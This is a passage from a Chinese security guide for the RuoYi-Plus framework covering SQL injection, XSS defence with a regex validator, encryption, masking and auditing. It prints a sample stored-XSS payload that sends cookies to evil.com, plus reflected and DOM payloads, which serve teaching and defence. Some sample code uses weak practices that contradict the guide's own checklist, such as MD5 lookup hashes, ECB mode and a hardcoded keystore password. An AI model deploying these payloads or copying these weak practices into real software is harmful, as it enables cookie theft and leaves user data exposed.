<!-- 仅在必须动态拼接表名、列名时使用,且必须做白名单校验 -->
<select id="selectByTable" resultType="Map">
    SELECT * FROM ${tableName} WHERE id = #{id}
</select>

<!-- 安全的动态排序: 使用白名单校验 -->
<select id="selectUserList" resultType="SysUser">
    SELECT * FROM sys_user
    <where>
        <if test="userName != null and userName != ''">
            AND user_name LIKE CONCAT('%', #{userName}, '%')
        </if>
    </where>
    <if test="orderBy != null and orderBy != ''">
        ORDER BY ${orderBy}  <!-- 必须在Java层做白名单校验 -->
    </if>
</select>
```

---

## XSS攻击防护

### XSS攻击类型

跨站脚本攻击(XSS)是将恶意脚本注入到Web页面中执行的攻击方式:

**1. 存储型XSS:**
```html
<!-- 攻击者提交的评论内容 -->
<script>document.location='http://evil.com/cookie?c='+document.cookie</script>

<!-- 页面显示时执行脚本,窃取所有访问者的Cookie -->
```

**2. 反射型XSS:**
```
http://example.com/search?q=<script>alert('XSS')</script>
```

**3. DOM型XSS:**
```javascript
// 页面中的不安全代码
document.getElementById('output').innerHTML = location.hash.substring(1);

// 攻击URL
http://example.com/page#<img src=x onerror=alert('XSS')>
```

### XSS检测注解

使用`@Xss`注解对输入参数进行XSS检测:

```java
/**
 * XSS防护注解
 * 用于校验字符串参数是否包含XSS攻击代码
 */
@Target({ElementType.FIELD, ElementType.PARAMETER})
@Retention(RetentionPolicy.RUNTIME)
@Constraint(validatedBy = XssValidator.class)
public @interface Xss {

    /**
     * 错误消息
     */
    String message() default "参数包含非法字符";

    /**
     * 检测模式
     */
    Mode mode() default Mode.BASIC;

    Class<?>[] groups() default {};

    Class<? extends Payload>[] payload() default {};

    /**
     * XSS检测模式
     */
    enum Mode {
        /**
         * 基础模式
         * 检测: script标签、事件处理器、伪协议、危险标签
         * 适用: 大多数业务场景
         */
        BASIC,

        /**
         * 严格模式
         * 在基础模式上增加: 编码绕过、函数调用、data协议
         * 适用: 安全要求高的场景
         */
        STRICT,

        /**
         * 宽松模式
         * 仅检测: script标签、iframe/object/embed
         * 适用: 需要允许部分HTML的场景
         */
        LENIENT
    }

}
```

### XSS验证器

```java
/**
 * XSS校验器
 * 实现JSR-303 Bean Validation接口
 */
public class XssValidator implements ConstraintValidator<Xss, String> {

    private Xss.Mode mode;

    /**
     * 基础模式检测模式列表
     */
    private static final List<Pattern> BASIC_PATTERNS = Arrays.asList(
        // script标签
        Pattern.compile("<script[^>]*>.*?</script>",
            Pattern.CASE_INSENSITIVE | Pattern.DOTALL),
        Pattern.compile("<script[^>]*>", Pattern.CASE_INSENSITIVE),
        Pattern.compile("</script>", Pattern.CASE_INSENSITIVE),

        // 事件处理器
        Pattern.compile("\\bon\\w+\\s*=", Pattern.CASE_INSENSITIVE),

        // 伪协议
        Pattern.compile("javascript\\s*:", Pattern.CASE_INSENSITIVE),
        Pattern.compile("vbscript\\s*:", Pattern.CASE_INSENSITIVE),

        // 样式表达式
        Pattern.compile("expression\\s*\\(", Pattern.CASE_INSENSITIVE),

        // 危险标签
        Pattern.compile("<object[^>]*>", Pattern.CASE_INSENSITIVE),
        Pattern.compile("<applet[^>]*>", Pattern.CASE_INSENSITIVE),
        Pattern.compile("<embed[^>]*>", Pattern.CASE_INSENSITIVE),
        Pattern.compile("<form[^>]*>", Pattern.CASE_INSENSITIVE),
        Pattern.compile("<iframe[^>]*>", Pattern.CASE_INSENSITIVE),
        Pattern.compile("<frameset[^>]*>", Pattern.CASE_INSENSITIVE),
        Pattern.compile("<frame[^>]*>", Pattern.CASE_INSENSITIVE)
    );

    /**
     * 严格模式额外检测模式
     */
    private static final List<Pattern> STRICT_PATTERNS = Arrays.asList(
        // HTML实体编码
        Pattern.compile("&#\\d+;"),
        Pattern.compile("&#x[0-9a-fA-F]+;"),

        // URL编码
        Pattern.compile("%3c", Pattern.CASE_INSENSITIVE),
        Pattern.compile("%3e", Pattern.CASE_INSENSITIVE),
        Pattern.compile("%22", Pattern.CASE_INSENSITIVE),
        Pattern.compile("%27", Pattern.CASE_INSENSITIVE),

        // Unicode编码
        Pattern.compile("\\\\x[0-9a-fA-F]{2}"),
        Pattern.compile("\\\\u[0-9a-fA-F]{4}"),

        // 危险函数
        Pattern.compile("\\beval\\s*\\(", Pattern.CASE_INSENSITIVE),
        Pattern.compile("\\bString\\.fromCharCode\\s*\\(", Pattern.CASE_INSENSITIVE),
        Pattern.compile("\\bdocument\\.", Pattern.CASE_INSENSITIVE),
        Pattern.compile("\\bwindow\\.", Pattern.CASE_INSENSITIVE),
        Pattern.compile("\\balert\\s*\\(", Pattern.CASE_INSENSITIVE),
        Pattern.compile("\\bconfirm\\s*\\(", Pattern.CASE_INSENSITIVE),
        Pattern.compile("\\bprompt\\s*\\(", Pattern.CASE_INSENSITIVE),

        // data协议
        Pattern.compile("data\\s*:", Pattern.CASE_INSENSITIVE)
    );

    /**
     * 宽松模式检测模式
     */
    private static final List<Pattern> LENIENT_PATTERNS = Arrays.asList(
        Pattern.compile("<script[^>]*>", Pattern.CASE_INSENSITIVE),
        Pattern.compile("</script>", Pattern.CASE_INSENSITIVE),
        Pattern.compile("javascript\\s*:", Pattern.CASE_INSENSITIVE),
        Pattern.compile("vbscript\\s*:", Pattern.CASE_INSENSITIVE),
        Pattern.compile("<iframe[^>]*>", Pattern.CASE_INSENSITIVE),
        Pattern.compile("<object[^>]*>", Pattern.CASE_INSENSITIVE),
        Pattern.compile("<embed[^>]*>", Pattern.CASE_INSENSITIVE)
    );

    @Override
    public void initialize(Xss xss) {
        this.mode = xss.mode();
    }

    @Override
    public boolean isValid(String value, ConstraintValidatorContext context) {
        if (StrUtil.isBlank(value)) {
            return true;
        }
        return !containsXss(value, mode);
    }

    /**
     * 检测是否包含XSS攻击代码
     */
    public static boolean containsXss(String value, Xss.Mode mode) {
        if (StrUtil.isBlank(value)) {
            return false;
        }

        List<Pattern> patterns;
        switch (mode) {
            case STRICT:
                // 严格模式: 基础 + 严格
                patterns = new ArrayList<>(BASIC_PATTERNS);
                patterns.addAll(STRICT_PATTERNS);
                break;
            case LENIENT:
                patterns = LENIENT_PATTERNS;
                break;
            case BASIC:
            default:
                patterns = BASIC_PATTERNS;
                break;
        }

        for (Pattern pattern : patterns) {
            if (pattern.matcher(value).find()) {
                return true;
            }
        }
        return false;
    }

}
```

### 使用示例

```java
/**
 * 用户注册请求体
 * 演示XSS防护配置
 */
public class RegisterBody {

    /**
     * 用户名 - 基础XSS检测
     */
    @Xss(message = "用户名不能包含脚本代码")
    @NotBlank(message = "用户名不能为空")
    @Size(min = 2, max = 20, message = "用户名长度2-20个字符")
    private String userName;

    /**
     * 昵称 - 基础XSS检测
     */
    @Xss(message = "昵称不能包含脚本代码")
    @Size(max = 30, message = "昵称最长30个字符")
    private String nickName;

    /**
     * 个人简介 - 宽松模式,允许部分HTML
     */
    @Xss(mode = Xss.Mode.LENIENT, message = "简介包含危险脚本")
    @Size(max = 500, message = "简介最长500个字符")
    private String remark;

    /**
     * 密码 - 不需要XSS检测(会被加密存储)
     */
    @NotBlank(message = "密码不能为空")
    private String password;

}

/**
 * 评论请求体
 * 严格模式XSS检测
 */
public class CommentBody {

    /**
     * 评论内容 - 严格模式检测
     */
    @Xss(mode = Xss.Mode.STRICT, message = "评论内容存在安全风险")
    @NotBlank(message = "评论内容不能为空")
    @Size(max = 2000, message = "评论最长2000个字符")
    private String content;

}

/**
 * 富文本内容
 * 宽松模式,但仍检测危险标签
 */
public class ArticleBody {

    /**
     * 文章标题 - 基础检测
     */
    @Xss(message = "标题不能包含脚本代码")
    @NotBlank(message = "标题不能为空")
    private String title;

    /**
     * 文章内容 - 宽松模式
     * 允许: 大部分HTML标签
     * 禁止: script、iframe、object、embed
     */
    @Xss(mode = Xss.Mode.LENIENT, message = "内容包含危险脚本")
    private String content;

}
```

---

## 最佳实践

### 1. 数据分类分级

根据数据敏感程度进行分类分级保护:

```java
/**
 * 数据敏感等级枚举
 */
public enum DataSensitiveLevel {

    /**
     * 公开数据
     * 特点: 可公开访问,无需保护
     * 示例: 产品信息、新闻公告
     */
    PUBLIC(1, "公开"),

    /**
     * 内部数据
     * 特点: 仅内部人员可访问
     * 示例: 内部通知、工作计划
     */
    INTERNAL(2, "内部"),

    /**
     * 敏感数据
     * 特点: 需要脱敏展示
     * 示例: 手机号、邮箱
     */
    SENSITIVE(3, "敏感"),

    /**
     * 机密数据
     * 特点: 需要加密存储
     * 示例: 身份证、银行卡、密码
     */
    CONFIDENTIAL(4, "机密"),

    /**
     * 绝密数据
     * 特点: 最高级别保护
     * 示例: 交易密钥、安全证书
     */
    TOP_SECRET(5, "绝密");

}

/**
 * 用户实体 - 数据分级保护示例
 */
public class SysUser {

    // 公开数据 - 无需保护
    private Long userId;
    private String userName;

    // 内部数据 - 权限控制
    private Long deptId;
    private String status;

    // 敏感数据 - 脱敏展示
    @Sensitive(strategy = SensitiveStrategy.PHONE)
    private String phonenumber;

    @Sensitive(strategy = SensitiveStrategy.EMAIL)
    private String email;

    // 机密数据 - 加密存储
    @EncryptField(algorithm = AlgorithmType.AES)
    private String idCard;

    @EncryptField(algorithm = AlgorithmType.SM4)
    private String bankCard;

    // 绝密数据 - 特殊保护
    // 密码使用BCrypt单向加密,不可逆
    private String password;

}
```

### 2. 加密密钥管理

安全的密钥管理策略:

```java
/**
 * 密钥管理服务
 */
@Service
public class KeyManagementService {

    /**
     * 从安全的密钥管理系统获取密钥
     * 不要在代码中硬编码密钥!
     */
    @Value("${encrypt.aes.key:#{null}}")
    private String aesKeyFromConfig;

    /**
     * 生成并安全存储密钥
     */
    public void generateAndStoreKeys() {
        // RSA密钥对
        Map<String, String> rsaKeys = EncryptUtils.generateRsaKey();
        // 将私钥加密后存储到安全位置(如HSM、Vault)
        secureStore("rsa.public", rsaKeys.get("publicKey"));
        secureStore("rsa.private", encryptPrivateKey(rsaKeys.get("privateKey")));

        // SM2密钥对
        Map<String, String> sm2Keys = EncryptUtils.generateSm2Key();
        secureStore("sm2.public", sm2Keys.get("publicKey"));
        secureStore("sm2.private", encryptPrivateKey(sm2Keys.get("privateKey")));
    }

    /**
     * 密钥轮换
     * 定期更换密钥以提高安全性
     */
    @Scheduled(cron = "0 0 0 1 * ?")  // 每月1号执行
    public void rotateKeys() {
        // 1. 生成新密钥
        String newKey = generateSecureKey();

        // 2. 使用新密钥重新加密数据
        reEncryptData(newKey);

        // 3. 安全删除旧密钥
        secureDeleteOldKey();

        // 4. 启用新密钥
        activateNewKey(newKey);
    }

}
```

### 3. 防止信息泄露

```java
/**
 * 全局异常处理器
 * 防止敏感信息通过异常泄露
 */
@RestControllerAdvice
public class GlobalExceptionHandler {

    private static final Logger log = LoggerFactory.getLogger(
        GlobalExceptionHandler.class
    );

    /**
     * 处理业务异常
     */
    @ExceptionHandler(ServiceException.class)
    public R<Void> handleServiceException(ServiceException e) {
        // 记录详细日志
        log.error("业务异常: {}", e.getMessage(), e);
        // 返回友好消息,不暴露详细信息
        return R.fail(e.getMessage());
    }

    /**
     * 处理SQL异常
     * 不要暴露SQL语句和数据库结构
     */
    @ExceptionHandler(SQLException.class)
    public R<Void> handleSqlException(SQLException e) {
        log.error("数据库异常: {}", e.getMessage(), e);
        // 返回通用错误消息
        return R.fail("数据处理异常,请稍后重试");
    }

    /**
     * 处理其他异常
     */
    @ExceptionHandler(Exception.class)
    public R<Void> handleException(Exception e) {
        log.error("系统异常: {}", e.getMessage(), e);
        // 不暴露堆栈信息
        return R.fail("系统繁忙,请稍后重试");
    }

}

/**
 * 日志脱敏处理
 * 在日志中对敏感信息脱敏
 */
public class LogSensitiveFilter {

    /**
     * 脱敏日志中的敏感信息
     */
    public static String desensitize(String logMessage) {
        if (StrUtil.isBlank(logMessage)) {
            return logMessage;
        }

        // 脱敏手机号
        logMessage = logMessage.replaceAll(
            "(1[3-9]\\d)\\d{4}(\\d{4})",
            "$1****$2"
        );

        // 脱敏身份证
        logMessage = logMessage.replaceAll(
            "(\\d{3})\\d{11}(\\d{4})",
            "$1***********$2"
        );

        // 脱敏银行卡
        logMessage = logMessage.replaceAll(
            "(\\d{4})\\d{8,12}(\\d{4})",
            "$1********$2"
        );

        // 脱敏密码字段
        logMessage = logMessage.replaceAll(
            "(password[\"']?\\s*[:=]\\s*[\"']?)[^\"',}\\]\\s]+",
            "$1******"
        );

        return logMessage;
    }

}
```

### 4. 安全的数据传输

```java
/**
 * 数据传输安全配置
 */
@Configuration
public class DataTransferSecurityConfig {

    /**
     * 配置HTTPS
     */
    @Bean
    public ServletWebServerFactory servletContainer() {
        TomcatServletWebServerFactory tomcat =
            new TomcatServletWebServerFactory();
        tomcat.addConnectorCustomizers(connector -> {
            connector.setScheme("https");
            connector.setSecure(true);
            connector.setPort(443);

            Http11NioProtocol protocol =
                (Http11NioProtocol) connector.getProtocolHandler();
            protocol.setSSLEnabled(true);
            protocol.setKeystoreFile("/path/to/keystore.jks");
            protocol.setKeystorePass("password");
            protocol.setKeyAlias("tomcat");
        });
        return tomcat;
    }

    /**
     * 强制HTTPS重定向
     */
    @Bean
    public TomcatServletWebServerFactory servletContainerWithRedirect() {
        TomcatServletWebServerFactory factory =
            new TomcatServletWebServerFactory() {
            @Override
            protected void postProcessContext(Context context) {
                SecurityConstraint securityConstraint = new SecurityConstraint();
                securityConstraint.setUserConstraint("CONFIDENTIAL");
                SecurityCollection collection = new SecurityCollection();
                collection.addPattern("/*");
                securityConstraint.addCollection(collection);
                context.addConstraint(securityConstraint);
            }
        };

        // HTTP重定向到HTTPS
        factory.addAdditionalTomcatConnectors(httpToHttpsRedirectConnector());
        return factory;
    }

}
```

### 5. 数据访问审计

```java
/**
 * 数据访问审计切面
 * 记录敏感数据的访问日志
 */
@Aspect
@Component
public class DataAccessAuditAspect {

    private static final Logger auditLog = LoggerFactory.getLogger("AUDIT");

    /**
     * 审计敏感数据查询
     */
    @Around("@annotation(dataAudit)")
    public Object auditDataAccess(ProceedingJoinPoint pjp,
            DataAudit dataAudit) throws Throwable {

        // 记录访问开始
        long startTime = System.currentTimeMillis();
        LoginUser user = LoginHelper.getLoginUser();
        String method = pjp.getSignature().toShortString();
        Object[] args = pjp.getArgs();

        try {
            Object result = pjp.proceed();

            // 记录成功访问
            auditLog.info("数据访问 - 用户: {}, 方法: {}, 参数: {}, 耗时: {}ms, 状态: 成功",
                user != null ? user.getUserName() : "anonymous",
                method,
                LogSensitiveFilter.desensitize(Arrays.toString(args)),
                System.currentTimeMillis() - startTime
            );

            return result;

        } catch (Exception e) {
            // 记录失败访问
            auditLog.warn("数据访问 - 用户: {}, 方法: {}, 参数: {}, 耗时: {}ms, 状态: 失败, 原因: {}",
                user != null ? user.getUserName() : "anonymous",
                method,
                LogSensitiveFilter.desensitize(Arrays.toString(args)),
                System.currentTimeMillis() - startTime,
                e.getMessage()
            );
            throw e;
        }
    }

}

/**
 * 数据审计注解
 */
@Target(ElementType.METHOD)
@Retention(RetentionPolicy.RUNTIME)
public @interface DataAudit {

    /**
     * 审计描述
     */
    String value() default "";

    /**
     * 数据类型
     */
    String dataType() default "";

    /**
     * 操作类型
     */
    String operation() default "QUERY";

}
```

---

## 常见问题

### 1. 加密后数据长度变化导致存储失败

**问题原因:**
- AES加密后数据长度会增加(约1.33倍)
- RSA加密后数据长度显著增加
- 数据库字段长度不足

**解决方案:**

```java
/**
 * 加密字段长度计算
 */
public class EncryptFieldLengthCalculator {

    /**
     * 计算加密后的字段长度
     * @param originalLength 原始数据最大长度
     * @param algorithm 加密算法
     * @param encode 编码方式
     * @return 建议的数据库字段长度
     */
    public static int calculateEncryptedLength(
            int originalLength,
            AlgorithmType algorithm,
            EncodeType encode) {

        int encryptedLength;

        switch (algorithm) {
            case BASE64:
                // Base64: 约1.33倍
                encryptedLength = (int) Math.ceil(originalLength * 4.0 / 3.0);
                break;

            case AES:
                // AES: 块大小16字节 + Base64
                int blocks = (originalLength / 16 + 1) * 16;
                encryptedLength = (int) Math.ceil(blocks * 4.0 / 3.0);
                break;

            case RSA:
                // RSA 2048: 输出256字节
                encryptedLength = 344;  // Base64编码后
                break;

            case SM2:
                // SM2: 输出约为原文+97字节
                encryptedLength = (int) Math.ceil(
                    (originalLength + 97) * 4.0 / 3.0
                );
                break;

            case SM4:
                // SM4: 类似AES
                int sm4Blocks = (originalLength / 16 + 1) * 16;
                encryptedLength = (int) Math.ceil(sm4Blocks * 4.0 / 3.0);
                break;

            default:
                encryptedLength = originalLength;
        }

        // Hex编码是Base64的1.5倍
        if (encode == EncodeType.HEX) {
            encryptedLength = (int) (encryptedLength * 1.5);
        }

        // 预留20%余量
        return (int) (encryptedLength * 1.2);
    }

}

// 数据库字段设计示例
// 原始手机号11位,AES+Base64加密后约24位,建议设置32
// 原始身份证18位,AES+Base64加密后约36位,建议设置48
// 原始银行卡19位,AES+Base64加密后约40位,建议设置64
```

### 2. 加密字段无法进行模糊查询

**问题原因:**
- 加密后的数据无法直接进行LIKE查询
- 每次加密结果可能不同(如果使用随机IV)

**解决方案:**

```java
/**
 * 加密字段查询方案
 */
public class EncryptedFieldQuerySolution {

    /**
     * 方案1: 存储加密数据的哈希索引
     * 适用于精确查询
     */
    @EncryptField
    private String phonenumber;      // 加密存储

    private String phonenumberHash;  // MD5哈希,用于精确查询

    public void setPhoneNumber(String phone) {
        this.phonenumber = phone;
        this.phonenumberHash = EncryptUtils.encryptByMd5(phone);
    }

    /**
     * 方案2: 存储部分明文用于模糊查询
     * 适用于需要模糊查询的场景
     */
    @EncryptField
    private String phonenumberEncrypted;  // 完整加密数据

    private String phonenumberPrefix;     // 前3位明文
    private String phonenumberSuffix;     // 后4位明文

    /**
     * 方案3: 使用确定性加密
     * 相同明文加密结果相同,可用于精确匹配
     */
    @EncryptField(algorithm = AlgorithmType.AES)
    private String phonenumberDeterministic;  // 确定性AES(ECB模式)

}

/**
 * 查询示例
 */
@Service
public class UserQueryService {

    /**
     * 通过手机号精确查询(使用哈希)
     */
    public SysUser findByPhone(String phone) {
        String phoneHash = EncryptUtils.encryptByMd5(phone);
        return userMapper.selectOne(
            new LambdaQueryWrapper<SysUser>()
                .eq(SysUser::getPhonenumberHash, phoneHash)
        );
    }

    /**
     * 通过手机号前缀模糊查询
     */
    public List<SysUser> findByPhonePrefix(String prefix) {
        return userMapper.selectList(
            new LambdaQueryWrapper<SysUser>()
                .likeRight(SysUser::getPhonenumberPrefix, prefix)
        );
    }

}
```

### 3. 脱敏数据导出问题

**问题原因:**
- 导出Excel时需要原始数据
- 但@Sensitive注解会自动脱敏

**解决方案:**

```java
/**
 * 导出时临时禁用脱敏
 */
@Service
public class UserExportService {

    /**
     * 导出用户数据(需要权限验证)
     */
    @PreAuthorize("hasPermission('user:export')")
    public void exportUsers(HttpServletResponse response) {
        // 方案1: 使用独立的导出VO,不带@Sensitive注解
        List<UserExportVo> exportList = userMapper.selectExportList();
        ExcelUtil.exportExcel(exportList, "用户数据", UserExportVo.class, response);
    }

    /**
     * 导出VO - 无脱敏注解
     */
    public static class UserExportVo {
        private String userName;
        private String phonenumber;  // 无@Sensitive
        private String email;        // 无@Sensitive
        private String idCard;       // 无@Sensitive
    }

    /**
     * 方案2: 在服务层手动获取未脱敏数据
     */
    public void exportWithPermission(HttpServletResponse response) {
        // 直接查询数据库,不经过序列化
        List<SysUser> users = userMapper.selectListWithoutSensitive();

        // 手动构建导出数据
        List<Map<String, Object>> exportData = users.stream()
            .map(user -> {
                Map<String, Object> map = new HashMap<>();
                map.put("userName", user.getUserName());
                map.put("phonenumber", user.getPhonenumber());
                // ... 其他字段
                return map;
            })
            .collect(Collectors.toList());

        // 导出
        ExcelUtil.exportExcel(exportData, "用户数据", response);
    }

}
```

### 4. 数据权限影响统计查询

**问题原因:**
- 统计查询需要全量数据
- 但数据权限会过滤部分数据

**解决方案:**

```java
/**
 * 统计查询跳过数据权限
 */
@Mapper
public interface StatisticsMapper {

    /**
     * 统计用户总数 - 跳过数据权限
     * 使用空的@DataPermission注解
     */
    @DataPermission({})
    @Select("SELECT COUNT(*) FROM sys_user WHERE del_flag = '0'")
    long countAllUsers();

    /**
     * 部门统计 - 应用数据权限
     * 只统计有权限查看的数据
     */
    @DataPermission({
        @DataColumn(key = "deptName", value = "dept_id")
    })
    @Select("SELECT dept_id, COUNT(*) as count FROM sys_user " +
            "WHERE del_flag = '0' GROUP BY dept_id")
    List<Map<String, Object>> countUsersByDept();

}

/**
 * 统计服务
 */
@Service
public class StatisticsService {

    /**
     * 获取系统统计数据
     * 根据用户权限返回不同统计范围
     */
    public StatisticsVo getStatistics() {
        StatisticsVo vo = new StatisticsVo();

        if (LoginHelper.isSuperAdmin()) {
            // 超级管理员: 全量统计
            vo.setUserCount(statisticsMapper.countAllUsers());
        } else {
            // 普通用户: 权限范围内统计
            vo.setUserCount(statisticsMapper.countUsersWithPermission());
        }

        return vo;
    }

}
```

### 5. 加解密性能问题

**问题原因:**
- 非对称加密(RSA/SM2)计算量大
- 大量数据加解密影响性能

**解决方案:**

```java
/**
 * 加密性能优化
 */
@Configuration
public class EncryptPerformanceConfig {

    /**
     * 加密器缓存
     * 避免重复创建加密器实例
     */
    @Bean
    public EncryptorManager encryptorManager() {
        EncryptorManager manager = new EncryptorManager();
        // 预热常用加密器
        manager.preloadEncryptors();
        return manager;
    }

}

/**
 * 批量加密优化
 */
@Service
public class BatchEncryptService {

    /**
     * 批量加密 - 使用对称加密
     * 对称加密速度是非对称的100倍以上
     */
    public List<String> batchEncrypt(List<String> dataList) {
        String password = getAesKey();
        return dataList.parallelStream()
            .map(data -> EncryptUtils.encryptByAes(data, password))
            .collect(Collectors.toList());
    }

    /**
     * 混合加密方案
     * 大量数据用AES,AES密钥用RSA
     */
    public EncryptedData hybridEncrypt(String data) {
        // 生成随机AES密钥
        String aesKey = generateRandomKey(32);

        // AES加密数据
        String encryptedData = EncryptUtils.encryptByAes(data, aesKey);

        // RSA加密AES密钥
        String encryptedKey = EncryptUtils.encryptByRsa(aesKey, rsaPublicKey);

        return new EncryptedData(encryptedData, encryptedKey);
    }

    /**
     * 异步加密
     * 不阻塞主线程
     */
    @Async
    public CompletableFuture<String> asyncEncrypt(String data) {
        String encrypted = EncryptUtils.encryptByAes(data, aesKey);
        return CompletableFuture.completedFuture(encrypted);
    }

}
```

---

## 安全检查清单

### 数据存储安全

- [ ] 敏感数据(身份证、银行卡等)已加密存储
- [ ] 密码使用BCrypt等不可逆算法存储
- [ ] 加密密钥未硬编码在代码中
- [ ] 加密密钥有定期轮换机制
- [ ] 数据库连接使用加密传输

### 数据传输安全

- [ ] 使用HTTPS协议传输数据
- [ ] 敏感API使用@ApiEncrypt加密
- [ ] API响应中敏感数据已脱敏
- [ ] 禁止在URL参数中传递敏感数据

### 数据访问安全

- [ ] 实现了数据权限控制
- [ ] 敏感操作有审计日志
- [ ] 异常信息不暴露敏感数据
- [ ] 日志中敏感信息已脱敏

### 输入验证安全

- [ ] 用户输入进行XSS检测
- [ ] 动态SQL参数进行注入检查
- [ ] 使用参数化查询而非字符串拼接
- [ ] 文件上传有类型和大小限制

### 代码安全

- [ ] 不使用不安全的加密算法(MD5、DES)
- [ ] 随机数使用SecureRandom生成
- [ ] 敏感配置使用加密存储
- [ ] 依赖库无已知安全漏洞

---

数据安全是一个系统工程,需要从数据的采集、存储、传输、使用、共享、销毁等全生命周期进行保护。RuoYi-Plus框架提供的数据安全特性覆盖了大部分常见场景,但在实际应用中还需要根据业务特点和合规要求进行针对性的安全加固。建议定期进行安全评估和渗透测试,及时发现和修复安全漏洞,持续提升系统的安全防护能力。
